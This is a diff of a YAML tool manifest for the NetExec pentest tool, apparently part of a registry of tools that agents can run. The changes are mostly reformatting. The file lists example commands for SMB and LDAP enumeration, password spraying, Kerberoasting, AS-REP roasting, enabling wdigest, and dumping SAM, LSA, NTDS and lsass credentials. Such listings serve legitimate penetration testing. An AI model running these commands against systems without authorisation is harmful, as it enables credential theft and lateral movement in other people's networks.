@@ -2,89 +2,94 @@
 trust_level: community
 id: darkiros-netexec
 namespace: darkiros:tool:netexec
-name: "NetExec"
-description: "NetExec - enumerate hosts, network"
-version: "1.0.0"
+name: NetExec
+description: NetExec - enumerate hosts, network
+version: 1.0.0
 capabilities:
-  - credential.bruteforce.spray
-  - credential.discovery.reconnaissance
-  - network.connect.remote
-  - security.execution.post-exploitation
+- credential.bruteforce.spray
+- credential.discovery.reconnaissance
+- network.connect.remote
+- security.execution.post-exploitation
 platforms:
-  - cross-platform
+- cross-platform
 techniques:
-  - credential-access
-  - discovery
-  - execution
-  - lateral-movement
+- credential-access
+- discovery
+- execution
+- lateral-movement
 execution:
-  template: "netexec"
+  template: netexec
   sandbox: execFile
   timeout_seconds: 30
   shell: false
 examples:
-  - description: "NetExec - enumerate hosts, network"
-    command: "nxc smb [ip_range]"
-  - description: "NetExec - enumerate password policy"
-    command: "nxc smb 10.10.10.161 -u '[user]' -p '[password]' --pass-pol"
-  - description: "NetExec - enumerate null session"
-    command: "nxc smb [ip] -u '' -p ''"
-  - description: "NetExec - enumerate anonymouse login"
-    command: "nxc smb [ip] -u 'a' -p ''"
-  - description: "NetExec - enumerate active session"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --sessions"
-  - description: "NetExec - enumerate domain users"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --users"
-  - description: "NetExec - enumerate users by bruteforce the RID"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --rid-brute"
-  - description: "NetExec - enumerate domain groups"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --groups"
-  - description: "NetExec - enumerate local groups"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --local-groups"
-  - description: "NetExec - enumerate shares"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --shares"
-  - description: "NetExec - enumerate disks"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --disks"
-  - description: "NetExec - enumerate smb target not signed"
-    command: "nxc smb [ip] --gen-relay-list [smb_targets.txt]"
-  - description: "NetExec - enumerate logged users"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' --loggedon-users"
-  - description: "NetExec - enable wdigest"
-    command: "nxc smb [ip] -u '[user|Administrator]' -p '[password]' --local-auth --wdigest enable"
-  - description: "NetExec - kerberos auth"
-    command: "nxc smb [ip] --kerberos"
-  - description: "NetExec - dump SAM"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --sam"
-  - description: "NetExec - dump LSA"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --lsa"
-  - description: "NetExec - dump NTDS"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --ntds"
-  - description: "NetExec - dump lsass"
-    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] -M lsassy"
-  - description: "NetExec - password spray (user=password)"
-    command: "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --no-bruteforce --continue-on-success"
-  - description: "NetExec - password spray multiple test"
-    command: "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --continue-on-success"
-  - description: "NetExec - ASREP Roasting enum whitout authentication"
-    command: "nxc ldap [dc-ip] -u [user|user.txt] -p '' --asreproast output.txt"
-  - description: "NetExec - Kerberoasting"
-    command: "nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting output.txt"
-  - description: "NetExec - Unconstrained delegation"
-    command: "nxc ldap [dc-ip] -u [user] -p [password] --trusted-for-delegation"
+- description: NetExec - enumerate hosts, network
+  command: nxc smb [ip_range]
+- description: NetExec - enumerate password policy
+  command: nxc smb 10.10.10.161 -u '[user]' -p '[password]' --pass-pol
+- description: NetExec - enumerate null session
+  command: nxc smb [ip] -u '' -p ''
+- description: NetExec - enumerate anonymouse login
+  command: nxc smb [ip] -u 'a' -p ''
+- description: NetExec - enumerate active session
+  command: nxc smb [ip] -u '[user]' -p '[password]' --sessions
+- description: NetExec - enumerate domain users
+  command: nxc smb [ip] -u '[user]' -p '[password]' --users
+- description: NetExec - enumerate users by bruteforce the RID
+  command: nxc smb [ip] -u '[user]' -p '[password]' --rid-brute
+- description: NetExec - enumerate domain groups
+  command: nxc smb [ip] -u '[user]' -p '[password]' --groups
+- description: NetExec - enumerate local groups
+  command: nxc smb [ip] -u '[user]' -p '[password]' --local-groups
+- description: NetExec - enumerate shares
+  command: nxc smb [ip] -u '[user]' -p '[password]' --shares
+- description: NetExec - enumerate disks
+  command: nxc smb [ip] -u '[user]' -p '[password]' --disks
+- description: NetExec - enumerate smb target not signed
+  command: nxc smb [ip] --gen-relay-list [smb_targets.txt]
+- description: NetExec - enumerate logged users
+  command: nxc smb [ip] -u '[user]' -p '[password]' --loggedon-users
+- description: NetExec - enable wdigest
+  command: nxc smb [ip] -u '[user|Administrator]' -p '[password]' --local-auth --wdigest
+    enable
+- description: NetExec - kerberos auth
+  command: nxc smb [ip] --kerberos
+- description: NetExec - dump SAM
+  command: nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --sam
+- description: NetExec - dump LSA
+  command: nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --lsa
+- description: NetExec - dump NTDS
+  command: nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --ntds
+- description: NetExec - dump lsass
+  command: nxc smb [ip] -u '[user]' -p '[password]' -d [domain] -M lsassy
+- description: NetExec - password spray (user=password)
+  command: nxc smb [dc-ip] -u [user.txt] -p [password.txt] --no-bruteforce --continue-on-success
+- description: NetExec - password spray multiple test
+  command: nxc smb [dc-ip] -u [user.txt] -p [password.txt] --continue-on-success
+- description: NetExec - ASREP Roasting enum whitout authentication
+  command: nxc ldap [dc-ip] -u [user|user.txt] -p '' --asreproast output.txt
+- description: NetExec - Kerberoasting
+  command: nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting output.txt
+- description: NetExec - Unconstrained delegation
+  command: nxc ldap [dc-ip] -u [user] -p [password] --trusted-for-delegation
 references:
-  - label: "Source"
-    url: "https://github.com/Pennyw0rth/NetExec"
-  - label: "Darkiros"
-    url: "https://darkiros.github.io/commands.html"
+- label: Source
+  url: https://github.com/Pennyw0rth/NetExec
+- label: Darkiros
+  url: https://darkiros.github.io/commands.html
 items:
-  - NoCreds
-  - Hash
-  - Password
+- NoCreds
+- Hash
+- Password
 services:
-  - SMB
-  - Kerberos
-  - LDAP
-  - WinRM
+- SMB
+- Kerberos
+- LDAP
+- WinRM
+features:
+- network-intensive
+- pipes-stdin
+- remote
 ---
 
 # NetExec
